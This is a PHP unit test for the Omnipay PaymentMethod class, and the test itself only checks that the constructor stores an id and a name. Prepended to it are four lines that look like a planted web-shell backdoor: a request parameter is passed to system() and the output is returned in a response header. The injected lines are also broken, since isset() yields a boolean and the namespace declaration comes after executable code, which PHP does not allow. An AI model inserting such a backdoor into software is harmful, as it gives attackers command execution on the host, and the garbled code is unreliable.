<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Common;

use Omnipay\Tests\TestCase;

class PaymentMethodTest extends TestCase
{
    public function testConstruct()
    {
        $method = new PaymentMethod('99', 'Acme Corp');

        $this->assertSame('99', $method->getId());
        $this->assertSame('Acme Corp', $method->getName());
    }
}
